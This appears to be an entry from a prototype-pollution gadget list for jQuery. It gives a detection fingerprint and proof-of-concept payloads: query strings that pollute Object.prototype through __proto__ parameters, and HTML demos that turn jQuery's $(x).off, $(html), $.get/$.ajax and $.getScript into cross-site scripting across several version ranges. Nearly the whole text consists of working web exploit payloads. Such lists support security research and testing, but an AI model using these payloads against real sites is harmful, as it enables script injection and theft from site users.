## jQuery 

URL: https://jquery.com/

### JS Fingerprint
```
return (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined')
```

### PoC

#### $(x).off jQuery all versions

```
?__proto__[preventDefault]=x&__proto__[handleObj]=x&__proto__[delegateTarget]=<img/src/onerror%3dalert(document.domain)>
```

```html
<script/src=https://code.jquery.com/jquery-3.3.1.js></script>
<script>
  Object.prototype.preventDefault='x'
  Object.prototype.handleObj='x'
  Object.prototype.delegateTarget='<img/src/onerror=alert(1)>'
  /* No extra code needed for jQuery 1 & 2 */
  $(document).off('foobar');
</script>
```

#### $(html) jQuery all versions

```
?__proto__[div][0]=1&__proto__[div][1]=<img src onerror%3dalert(1)>&__proto__[div][2]=1
```

```html
<script/src=https://code.jquery.com/jquery-3.3.1.js></script>
<script>
  Object.prototype.div=['1','<img src onerror=alert(1)>','1']
</script>
<script>
  $('<div x="x"></div>')
</script>
```

#### $.get jQuery >= 3.0.0

* Also can be used for $.post, $.ajax, $.getJSON

```
?__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script
```

```html
<script src=https://code.jquery.com/jquery-3.5.1.js></script>
<script> 
  Object.prototype.url = ['data:,alert(1)//'];   
  Object.prototype.dataType = 'script';
</script>      
<script>
  $.get('https://google.com/'); 
  $.post('https://google.com/'); 
</script>
```

#### $.getScript jQuery >= 3.4.0
```
?__proto__[src][]=data:,alert(1)//
```

```html
<script src=https://code.jquery.com/jquery-3.5.1.js></script>
<script>
  Object.prototype.src = ['data:,alert(1)//']
</script>
<script>
  $.getScript('https://google.com/')
</script>
```

#### $.getScript jQuery 3.0.0 - 3.3.1

```
?__proto__[url]=data:,alert(1)//
```

```html
<script/src=https://code.jquery.com/jquery-3.3.1.js></script>
<script>
  Object.prototype.url = 'data:,alert(1)//'
</script>
<script>
  $.getScript('https://google.com/')
</script>
```